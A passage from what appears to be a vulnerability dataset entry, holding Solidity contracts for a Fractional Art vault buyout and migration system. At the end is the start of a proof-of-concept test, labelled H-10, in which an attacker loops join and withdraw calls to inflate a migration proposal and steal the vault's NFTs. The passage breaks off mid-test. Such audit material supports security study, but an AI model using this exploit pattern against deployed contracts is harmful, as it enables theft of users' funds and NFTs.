_to,\n        uint256[] memory _ids,\n        uint256[] memory _values,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyFractions(address _vault, uint256 _amount) external payable;\n\n    function buyoutInfo(address)\n        external\n        view\n        returns (\n            uint256 startTime,\n            address proposer,\n            State state,\n            uint256 fractionPrice,\n            uint256 ethBalance,\n            uint256 lastTotalSupply\n        );\n\n    function cash(address _vault, bytes32[] memory _burnProof) external;\n\n    function end(address _vault, bytes32[] memory _burnProof) external;\n\n    function getLeafNodes() external view returns (bytes32[] memory nodes);\n\n    function getPermissions()\n        external\n        view\n        returns (Permission[] memory permissions);\n\n    function redeem(address _vault, bytes32[] memory _burnProof) external;\n\n    function registry() external view returns (address);\n\n    function sellFractions(address _vault, uint256 _amount) external;\n\n    function start(address _vault) external payable;\n\n    function supply() external view returns (address);\n\n    function transfer() external view returns (address);\n\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] memory _erc1155TransferProof\n    ) external;\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {ISupply} from \"../interfaces/ISupply.sol\";\nimport {IVaultRegistry} from \"../interfaces/IVaultRegistry.sol\";\nimport \"../constants/Supply.sol\";\n\n/// @title Supply\n/// @author Fractional Art\n/// @notice Target contract for minting and burning fractional tokens\ncontract Supply is ISupply {\n    /// @notice Address of VaultRegistry contract\n    address immutable registry;\n\n    /// @notice Initializes registry contract\n    constructor(address _registry) {\n        registry = _registry;\n    }\n\n    /// @notice Mints fractional tokens\n    /// @param _to Target address\n    /// @param _value Transfer amount\n    function mint(address _to, uint256 _value) external {\n        // Utilize assembly to perform an optimized Vault Registry mint\n        address _registry = registry;\n\n        assembly {\n            // Write calldata to the free memory pointer, but restore it later.\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n\n            // Write calldata into memory, starting with the function selector\n            mstore(REGISTRY_MINT_SIG_PTR, REGISTRY_MINT_SIGNATURE)\n            mstore(REGISTRY_MINT_TO_PRT, _to) // Append the \"_to\" argument\n            mstore(REGISTRY_MINT_VALUE_PTR, _value) // Append the \"_value\" argument\n\n            let success := call(\n                gas(),\n                _registry,\n                0,\n                REGISTRY_MINT_SIG_PTR,\n                REGISTRY_MINT_LENGTH,\n                0,\n                0\n            )\n\n            // If the mint reverted\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as sufficient\n                // gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary. Start\n                    // by computing word size of returndata & allocated memory.\n                    let returnDataWords := div(returndatasize(), ONE_WORD)\n\n                    // Note: use the free memory pointer in place of msize() to\n                    // work around a Yul warning that prevents accessing msize\n                    // directly when the IR pipeline is activated.\n                    let msizeWords := div(memPointer, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing memory.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert, giving memory region with copied returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Otherwise revert with a generic error message\n                mstore(MINT_ERROR_SIG_PTR, MINT_ERROR_SIGNATURE)\n                mstore(MINT_ERROR_ACCOUNT_PTR, _to)\n                revert(MINT_ERROR_SIG_PTR, MINT_ERROR_LENGTH)\n            }\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n\n    /// @notice Burns fractional tokens\n    /// @param _from Source address\n    /// @param _value Burn amount\n    function burn(address _from, uint256 _value) external {\n        // Utilize assembly to perform an optimized Vault Registry burn\n        address _registry = registry;\n\n        assembly {\n            // Write calldata to the free memory pointer, but restore it later.\n            let memPointer := mload(FREE_MEMORY_POINTER_SLOT)\n\n            // Write calldata into memory, starting with the function selector\n            mstore(REGISTRY_BURN_SIG_PTR, REGISTRY_BURN_SIGNATURE)\n            mstore(REGISTRY_BURN_FROM_PTR, _from) // Append the \"_from\" argument\n            mstore(REGISTRY_BURN_VALUE_PTR, _value) // Append the \"_value\" argument\n\n            let success := call(\n                gas(),\n                _registry,\n                0,\n                REGISTRY_BURN_SIG_PTR,\n                REGISTRY_BURN_LENGTH,\n                0,\n                0\n            )\n\n            // If the mint reverted\n            if iszero(success) {\n                // If it returned a message, bubble it up as long as sufficient\n                // gas remains to do so:\n                if returndatasize() {\n                    // Ensure that sufficient gas is available to copy\n                    // returndata while expanding memory where necessary. Start\n                    // by computing word size of returndata & allocated memory.\n                    let returnDataWords := div(returndatasize(), ONE_WORD)\n\n                    // Note: use the free memory pointer in place of msize() to\n                    // work around a Yul warning that prevents accessing msize\n                    // directly when the IR pipeline is activated.\n                    let msizeWords := div(memPointer, ONE_WORD)\n\n                    // Next, compute the cost of the returndatacopy.\n                    let cost := mul(COST_PER_WORD, returnDataWords)\n\n                    // Then, compute cost of new memory allocation.\n                    if gt(returnDataWords, msizeWords) {\n                        cost := add(\n                            cost,\n                            add(\n                                mul(\n                                    sub(returnDataWords, msizeWords),\n                                    COST_PER_WORD\n                                ),\n                                div(\n                                    sub(\n                                        mul(returnDataWords, returnDataWords),\n                                        mul(msizeWords, msizeWords)\n                                    ),\n                                    MEMORY_EXPANSION_COEFFICIENT\n                                )\n                            )\n                        )\n                    }\n\n                    // Finally, add a small constant and compare to gas\n                    // remaining; bubble up the revert data if enough gas is\n                    // still available.\n                    if lt(add(cost, EXTRA_GAS_BUFFER), gas()) {\n                        // Copy returndata to memory; overwrite existing memory.\n                        returndatacopy(0, 0, returndatasize())\n\n                        // Revert, giving memory region with copied returndata.\n                        revert(0, returndatasize())\n                    }\n                }\n\n                // Otherwise revert with a generic error message\n                mstore(BURN_ERROR_SIG_PTR, BURN_ERROR_SIGNATURE)\n                mstore(BURN_ERROR_ACCOUNT_PTR, _from)\n                revert(BURN_ERROR_SIG_PTR, BURN_ERROR_LENGTH)\n            }\n\n            // Restore the original free memory pointer.\n            mstore(FREE_MEMORY_POINTER_SLOT, memPointer)\n\n            // Restore the zero slot to zero.\n            mstore(ZERO_SLOT, 0)\n        }\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {IBuyout, Auction, State} from \"../interfaces/IBuyout.sol\";\nimport {IERC1155} from \"../interfaces/IERC1155.sol\";\nimport {ISupply} from \"../interfaces/ISupply.sol\";\nimport {ITransfer} from \"../interfaces/ITransfer.sol\";\nimport {IVault} from \"../interfaces/IVault.sol\";\nimport {IVaultRegistry, Permission} from \"../interfaces/IVaultRegistry.sol\";\nimport {Multicall} from \"../utils/Multicall.sol\";\nimport {NFTReceiver} from \"../utils/NFTReceiver.sol\";\nimport {SafeSend} from \"../utils/SafeSend.sol\";\nimport {SelfPermit} from \"../utils/SelfPermit.sol\";\n\n/// @title Buyout\n/// @author Fractional Art\n/// @notice Module contract for vaults to hold buyout pools\n/// - A fractional owner starts an auction for a vault by depositing any amount of ether and fractional tokens into a pool.\n/// - During the proposal period (2 days) users can sell their fractional tokens into the pool for ether.\n/// - During the rejection period (4 days) users can buy fractional tokens from the pool with ether.\n/// - If a pool has more than 51% of the total supply after 4 days, the buyout is successful and the proposer\n///   gains access to withdraw the underlying assets (ERC20, ERC721, and ERC1155 tokens) from the vault.\n///   Otherwise the buyout is considered unsuccessful and a new one may then begin.\n/// - NOTE: A vault may only have one active buyout at any given time.\n/// - buyoutPrice = (ethDeposit * 100) / (100 - ((fractionDeposit * 100) / totalSupply))\n/// - buyoutShare = (tokenBalance * ethBalance) / (totalSupply + tokenBalance)\ncontract Buyout is IBuyout, Multicall, NFTReceiver, SafeSend, SelfPermit {\n    /// @notice Address of VaultRegistry contract\n    address public registry;\n    /// @notice Address of Supply target contract\n    address public supply;\n    /// @notice Address of Transfer target contract\n    address public transfer;\n    /// @notice Time length of the proposal period\n    uint256 public constant PROPOSAL_PERIOD = 2 days;\n    /// @notice Time length of the rejection period\n    uint256 public constant REJECTION_PERIOD = 4 days;\n    /// @notice Mapping of vault address to auction struct\n    mapping(address => Auction) public buyoutInfo;\n\n    /// @notice Initializes registry, supply, and transfer contracts\n    constructor(\n        address _registry,\n        address _supply,\n        address _transfer\n    ) {\n        registry = _registry;\n        supply = _supply;\n        transfer = _transfer;\n    }\n\n    /// @dev Callback for receiving ether when the calldata is empty\n    receive() external payable {}\n\n    /// @notice Starts the auction for a buyout pool\n    /// @param _vault Address of the vault\n    function start(address _vault) external payable {\n        // Reverts if ether deposit amount is zero\n        if (msg.value == 0) revert ZeroDeposit();\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Gets total supply of fractional tokens for the vault\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        // Gets total balance of fractional tokens owned by caller\n        uint256 depositAmount = IERC1155(token).balanceOf(msg.sender, id);\n\n        // Transfers fractional tokens into the buyout pool\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            depositAmount,\n            \"\"\n        );\n\n        // Calculates price of buyout and fractions\n        // @dev Reverts with division error if called with total supply of tokens\n        uint256 buyoutPrice = (msg.value * 100) /\n            (100 - ((depositAmount * 100) / totalSupply));\n        uint256 fractionPrice = buyoutPrice / totalSupply;\n\n        // Sets info mapping of the vault address to auction struct\n        buyoutInfo[_vault] = Auction(\n            block.timestamp,\n            msg.sender,\n            State.LIVE,\n            fractionPrice,\n            msg.value,\n            totalSupply\n        );\n        // Emits event for starting auction\n        emit Start(\n            _vault,\n            msg.sender,\n            block.timestamp,\n            buyoutPrice,\n            fractionPrice\n        );\n    }\n\n    /// @notice Sells fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function sellFractions(address _vault, uint256 _amount) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        // Reverts if auction state is not live\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of proposal period\n        uint256 endTime = startTime + PROPOSAL_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n\n        // Transfers fractional tokens to pool from caller\n        IERC1155(token).safeTransferFrom(\n            msg.sender,\n            address(this),\n            id,\n            _amount,\n            \"\"\n        );\n\n        // Updates ether balance of pool\n        uint256 ethAmount = fractionPrice * _amount;\n        buyoutInfo[_vault].ethBalance -= ethAmount;\n        // Transfers ether amount to caller\n        _sendEthOrWeth(msg.sender, ethAmount);\n        // Emits event for selling fractions into pool\n        emit SellFractions(msg.sender, _amount);\n    }\n\n    /// @notice Buys fractional tokens in exchange for ether from a pool\n    /// @param _vault Address of the vault\n    /// @param _amount Transfer amount of fractions\n    function buyFractions(address _vault, uint256 _amount) external payable {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (uint256 startTime, , State current, uint256 fractionPrice, , ) = this\n            .buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is greater than end time of rejection period\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp > endTime)\n            revert TimeExpired(block.timestamp, endTime);\n        // Reverts if payment amount does not equal price of fractional amount\n        if (msg.value != fractionPrice * _amount) revert InvalidPayment();\n\n        // Transfers fractional tokens to caller\n        IERC1155(token).safeTransferFrom(\n            address(this),\n            msg.sender,\n            id,\n            _amount,\n            \"\"\n        );\n        // Updates ether balance of pool\n        buyoutInfo[_vault].ethBalance += msg.value;\n        // Emits event for buying fractions from pool\n        emit BuyFractions(msg.sender, _amount);\n    }\n\n    /// @notice Ends the auction for a live buyout pool\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function end(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not live\n        (\n            uint256 startTime,\n            address proposer,\n            State current,\n            ,\n            uint256 ethBalance,\n\n        ) = this.buyoutInfo(_vault);\n        State required = State.LIVE;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if current time is less than or equal to end time of auction\n        uint256 endTime = startTime + REJECTION_PERIOD;\n        if (block.timestamp <= endTime)\n            revert TimeNotElapsed(block.timestamp, endTime);\n\n        uint256 tokenBalance = IERC1155(token).balanceOf(address(this), id);\n        // Checks totalSupply of auction pool to determine if buyout is successful or not\n        if (\n            (tokenBalance * 1000) /\n                IVaultRegistry(registry).totalSupply(_vault) >\n            500\n        ) {\n            // Initializes vault transaction\n            bytes memory data = abi.encodeCall(\n                ISupply.burn,\n                (address(this), tokenBalance)\n            );\n            // Executes burn of fractional tokens from pool\n            IVault(payable(_vault)).execute(supply, data, _burnProof);\n            // Sets buyout state to successful\n            buyoutInfo[_vault].state = State.SUCCESS;\n            // Emits event for ending successful auction\n            emit End(_vault, State.SUCCESS, proposer);\n        } else {\n            // Deletes auction info\n            delete buyoutInfo[_vault];\n            // Transfers fractions and ether back to proposer of the buyout pool\n            IERC1155(token).safeTransferFrom(\n                address(this),\n                proposer,\n                id,\n                tokenBalance,\n                \"\"\n            );\n            _sendEthOrWeth(proposer, ethBalance);\n            // Emits event for ending unsuccessful auction\n            emit End(_vault, State.INACTIVE, proposer);\n        }\n    }\n\n    /// @notice Cashes out proceeds from a successful buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function cash(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (address token, uint256 id) = IVaultRegistry(registry).vaultToToken(\n            _vault\n        );\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, , State current, , uint256 ethBalance, ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller has a balance of zero fractional tokens\n        uint256 tokenBalance = IERC1155(token).balanceOf(msg.sender, id);\n        if (tokenBalance == 0) revert NoFractions();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ISupply.burn,\n            (msg.sender, tokenBalance)\n        );\n        // Executes burn of fractional tokens from caller\n        IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n        // Transfers buyout share amount to caller based on total supply\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        uint256 buyoutShare = (tokenBalance * ethBalance) /\n            (totalSupply + tokenBalance);\n        _sendEthOrWeth(msg.sender, buyoutShare);\n        // Emits event for cashing out of buyout pool\n        emit Cash(_vault, msg.sender, buyoutShare);\n    }\n\n    /// @notice Terminates a vault with an inactive buyout\n    /// @param _vault Address of the vault\n    /// @param _burnProof Merkle proof for burning fractional tokens\n    function redeem(address _vault, bytes32[] calldata _burnProof) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not inactive\n        (, , State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.INACTIVE;\n        if (current != required) revert InvalidState(required, current);\n\n        // Initializes vault transaction\n        uint256 totalSupply = IVaultRegistry(registry).totalSupply(_vault);\n        bytes memory data = abi.encodeCall(\n            ISupply.burn,\n            (msg.sender, totalSupply)\n        );\n        // Executes burn of fractional tokens from caller\n        IVault(payable(_vault)).execute(supply, data, _burnProof);\n\n        // Sets buyout state to successful and proposer to caller\n        (buyoutInfo[_vault].state, buyoutInfo[_vault].proposer) = (\n            State.SUCCESS,\n            msg.sender\n        );\n        // Emits event for redeem underlying assets from the vault\n        emit Redeem(_vault, msg.sender);\n    }\n\n    /// @notice Withdraws an ERC-20 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _value Transfer amount\n    /// @param _erc20TransferProof Merkle proof for transferring an ERC-20 token\n    function withdrawERC20(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _value,\n        bytes32[] calldata _erc20TransferProof\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller is not the auction winner\n        if (msg.sender != proposer) revert NotWinner();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC20Transfer,\n            (_token, _to, _value)\n        );\n        // Executes transfer of ERC721 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc20TransferProof);\n    }\n\n    /// @notice Withdraws an ERC-721 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _tokenId ID of the token\n    /// @param _erc721TransferProof Merkle proof for transferring an ERC-721 token\n    function withdrawERC721(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _tokenId,\n        bytes32[] calldata _erc721TransferProof\n    ) external {\n        // Reverts if address is not a registered vault\n        (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n        if (id == 0) revert NotVault(_vault);\n        // Reverts if auction state is not successful\n        (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n        State required = State.SUCCESS;\n        if (current != required) revert InvalidState(required, current);\n        // Reverts if caller is not the auction winner\n        if (msg.sender != proposer) revert NotWinner();\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC721TransferFrom,\n            (_token, _vault, _to, _tokenId)\n        );\n        // Executes transfer of ERC721 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc721TransferProof);\n    }\n\n    /// @notice Withdraws an ERC-1155 token from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _id ID of the token type\n    /// @param _value Transfer amount\n    /// @param _erc1155TransferProof Merkle proof for transferring an ERC-1155 token\n    function withdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256 _id,\n        uint256 _value,\n        bytes32[] calldata _erc1155TransferProof\n    ) external {\n        // Creates local scope to avoid stack too deep\n        {\n            // Reverts if address is not a registered vault\n            (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n            if (id == 0) revert NotVault(_vault);\n            // Reverts if auction state is not successful\n            (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n            State required = State.SUCCESS;\n            if (current != required) revert InvalidState(required, current);\n            // Reverts if caller is not the auction winner\n            if (msg.sender != proposer) revert NotWinner();\n        }\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC1155TransferFrom,\n            (_token, _vault, _to, _id, _value)\n        );\n        // Executes transfer of ERC1155 token to caller\n        IVault(payable(_vault)).execute(transfer, data, _erc1155TransferProof);\n    }\n\n    /// @notice Batch withdraws ERC-1155 tokens from a vault\n    /// @param _vault Address of the vault\n    /// @param _token Address of the token\n    /// @param _to Address of the receiver\n    /// @param _ids IDs of each token type\n    /// @param _values Transfer amounts per token type\n    /// @param _erc1155BatchTransferProof Merkle proof for transferring multiple ERC-1155 tokens\n    function batchWithdrawERC1155(\n        address _vault,\n        address _token,\n        address _to,\n        uint256[] calldata _ids,\n        uint256[] calldata _values,\n        bytes32[] calldata _erc1155BatchTransferProof\n    ) external {\n        // Creates local scope to avoid stack too deep\n        {\n            // Reverts if address is not a registered vault\n            (, uint256 id) = IVaultRegistry(registry).vaultToToken(_vault);\n            if (id == 0) revert NotVault(_vault);\n            // Reverts if auction state is not successful\n            (, address proposer, State current, , , ) = this.buyoutInfo(_vault);\n            State required = State.SUCCESS;\n            if (current != required) revert InvalidState(required, current);\n            // Reverts if caller is not the auction winner\n            if (msg.sender != proposer) revert NotWinner();\n        }\n\n        // Initializes vault transaction\n        bytes memory data = abi.encodeCall(\n            ITransfer.ERC1155BatchTransferFrom,\n            (_token, _vault, _to, _ids, _values)\n        );\n        // Executes batch transfer of multiple ERC1155 tokens to caller\n        IVault(payable(_vault)).execute(\n            transfer,\n            data,\n            _erc1155BatchTransferProof\n        );\n    }\n\n    /// @notice Gets the list of leaf nodes used to generate a merkle tree\n    /// @dev Leaf nodes are hashed permissions of the merkle tree\n    /// @return nodes Hashes of leaf nodes\n    function getLeafNodes() external view returns (bytes32[] memory nodes) {\n        nodes = new bytes32[](5);\n        // Gets list of permissions from this module\n        Permission[] memory permissions = getPermissions();\n        for (uint256 i; i < permissions.length; ) {\n            // Hashes permission into leaf node\n            nodes[i] = keccak256(abi.encode(permissions[i]));\n            // Can't overflow since loop is a fixed size\n            unchecked {\n                ++i;\n            }\n        }\n    }\n\n    /// @notice Gets the list of permissions installed on a vault\n    /// @dev Permissions consist of a module contract, target contract, and function selector\n    /// @return permissions List of vault permissions\n    function getPermissions()\n        public\n        view\n        returns (Permission[] memory permissions)\n    {\n        permissions = new Permission[](5);\n        // Burn function selector from supply contract\n        permissions[0] = Permission(\n            address(this),\n            supply,\n            ISupply(supply).burn.selector\n        );\n        // ERC20Transfer function selector from transfer contract\n        permissions[1] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC20Transfer.selector\n        );\n        // ERC721TransferFrom function selector from transfer contract\n        permissions[2] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC721TransferFrom.selector\n        );\n        // ERC1155TransferFrom function selector from transfer contract\n        permissions[3] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC1155TransferFrom.selector\n        );\n        // ERC1155BatchTransferFrom function selector from transfer contract\n        permissions[4] = Permission(\n            address(this),\n            transfer,\n            ITransfer(transfer).ERC1155BatchTransferFrom.selector\n        );\n    }\n}\n\n\n// SPDX-License-Identifier: MIT\npragma solidity 0.8.13;\n\nimport {Permission} from \"./IVaultRegistry.sol\";\nimport {State} from \"./IBuyout.sol\";\n\n/// @dev Struct of migration proposal info for a vault\nstruct Proposal {\n    // Start time of the migration proposal\n    uint256 startTime;\n    // Target buyout price for the migration\n    uint256 targetPrice;\n    // Total ether contributed to the migration\n    uint256 totalEth;\n    // Total fractions contributed to the migration\n    uint256 totalFractions;\n    // Module contract addresses proposed for the migration\n    address[] modules;\n    // Plugin contract addresses proposed for the migration\n    address[] plugins;\n    // Function selectors for the proposed plugins\n    bytes4[] selectors;\n    // Address for the new vault to migrate to (if buyout is succesful)\n    address newVault;\n    // Boolean status to check if the propoal is active\n    bool isCommited;\n    // Old fraction supply for a given vault\n    uint256 oldFractionSupply;\n    // New fraction supply for a given vault that has succesfully migrated\n    uint256 newFractionSupply;\n    // Boolean status to check that the fractions have already been migrated\n    bool fractionsMigrated;\n}\n\n/// @dev Interface for Migration module contract\ninterface IMigration {\n    /// @dev Emitted when someone attempts to mint more new fractions into existence\n    error NewFractionsAlreadyMinted();\n    /// @dev Emitted when someone attempts to deploy a vault after a migration has already redeployed one\n    error NewVaultAlreadyDeployed(address _newVault);\n    /// @dev Emitted when a user attempts to withdraw non existing contributions\n    error NoContributionToWithdraw();\n    /// @dev Emitted when the buyout was not initiated by a migration\n    error NotProposalBuyout();\n    /// @dev Emitted when an action is taken on a proposal id that does not exist\n    error NotProposed();\n    /// @dev Emitted when the address is not a registered vault\n    error NotVault(address _vault);\n    /// @dev Emitted when a user attempts to settle an action before a new vault has been deployed\n    error NoVaultToMigrateTo();\n    /// @dev Emitted when an action is taken on a migration with a proposal period that has ended\n    error ProposalOver();\n    /// @dev Emitted when a migration is attempted after an unsuccessful buyout\n    error UnsuccessfulMigration();\n\n    /// @dev Event log for minting the new fractional supply for a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the new vault\n    /// @param _proposalId id of the proposal\n    /// @param _amount Amount of fractions settled\n    event FractionsMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        uint256 _amount\n    );\n    /// @dev Event log for settling a vault\n    /// @param _oldVault Address of the old vault\n    /// @param _newVault Address of the vault\n    /// @param _proposalId id of the proposal for the Migration\n    /// @param _modules Addresses of module contracts\n    /// @param _plugins Addresses of plugin contracts\n    /// @param _selectors List of plugin function selectors\n    event VaultMigrated(\n        address indexed _oldVault,\n        address indexed _newVault,\n        uint256 _proposalId,\n        address[] _modules,\n        address[] _plugins,\n        bytes4[] _selectors\n    );\n\n    function PROPOSAL_PERIOD() external view returns (uint256);\n\n    function batchMigrateVaultERC1155(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256[] memory _ids,\n        uint256[] memory _amounts,\n        bytes32[] memory _erc1155BatchTransferProof\n    ) external;\n\n    function buyout() external view returns (address payable);\n\n    function commit(address _vault, uint256 _proposalId)\n        external\n        returns (bool started);\n\n    function generateMerkleTree(address[] memory _modules)\n        external\n        view\n        returns (bytes32[] memory hashes);\n\n    function join(\n        address _vault,\n        uint256 _proposalId,\n        uint256 _amount\n    ) external payable;\n\n    function leave(address _vault, uint256 _proposalId) external;\n\n    function migrateFractions(address _vault, uint256 _proposalId) external;\n\n    function migrateVaultERC20(\n        address _vault,\n        uint256 _proposalId,\n        address _token,\n        uint256 _amount,\n        bytes32[] memory _erc20TransferProof\n    ) external;\n\n    function migrateVaultERC721(\n        address _vault,\n        uint256 _proposalId,\n        address _nft,\n        uint256 _tokenId,\n        bytes32[] memory _erc721TransferProof\n    ) external;\n\n    function migrationInfo(address, uint256)\n        external\n        view\n        returns (\n            uint256 startTime,\n            uint256 targetPrice,\n            uint256 totalEth,\n            uint256 totalFractions,\n            address newVault,\n            bool isCommited,\n            uint256 oldFractionSupply,\n            uint256 newFractionSupply,\n            bool fractionsMigrated\n        );\n\n    function nextId() external view returns (uint256);\n\n    function propose(\n        address _vault,\n        address[] memory _modules,\n        address[] memory _plugins,\n        bytes4[] memory _selectors,\n        uint256 _newFractionSupply,\n        uint256 _targetPrice\n    ) external;\n\n    function registry() external view returns (address);\n\n    function settleFractions(\n        address _vault,\n        uint256 _proposalId,\n        bytes32[] memory _mintProof\n    ) external;\n\n    function settleVault(address _vault, uint256 _proposalId) external;\n\n    function withdrawContribution(address _vault, uint256 _proposalId) external;\n}\n\n\n",
        "CodeNames": [
            "IBuyout.sol",
            "Supply.sol",
            "Buyout.sol",
            "IMigration.sol"
        ],
        "VulnerabilityDesc": [
            {
                "Name": "H-10",
                "Location": [
                    "\n    function testProposalAttack() public {\n        initializeMigration(alice, bob, TOTAL_SUPPLY, HALF_SUPPLY, true);\n        (nftReceiverSelectors, nftReceiverPlugins) = initializeNFTReceiver();\n        address[] memory modules = new address[(1);\n        modules[0] = address(mockModule);\n\n        // STEP 0\n        // The attacker waits until a proposal with over 51% joins and a nice amount of ETH is made\n\n        // STEP 1\n        // Alice makes a legit proposal\n        alice.migrationModule.propose(\n            vault,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            TOTAL_SUPPLY * 2,\n            1 ether\n        );\n\n        // STEP 3\n        // Alice joins his proposal with 50 ETH and 5,000 tokens out of a total supply of 10,000\n        alice.migrationModule.join{value: 50 ether}(vault, 1, 5000);\n\n        // NOTE: In a real world scenario, several members will join Alice's legit proposal with their own ETH and tokens,\n        // but to make this PoC easier to read, instead of creating several fake accounts,\n        // let's have just Alice join his own proposal with 50% of token supply.\n\n        // STEP 4\n        // Bob makes an evil proposal, with evil modules to steal the vault's NFTs\n        bob.migrationModule.propose(\n            vault,\n            modules,\n            nftReceiverPlugins,\n            nftReceiverSelectors,\n            TOTAL_SUPPLY,\n            1 ether\n        );\n\n        // STEP 5\n        // Bob joins and then withdraws from the proposal in loop, to inflate the ETH of his proposal\n        // and total locked tokens (thanks to a bug in the `withdrawContribution` function)\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        bob.migrationModule.join{value: 10 ether}(vault, 2, 25);\n        bob.migrationModule.withdrawContribution(vault, 2);\n        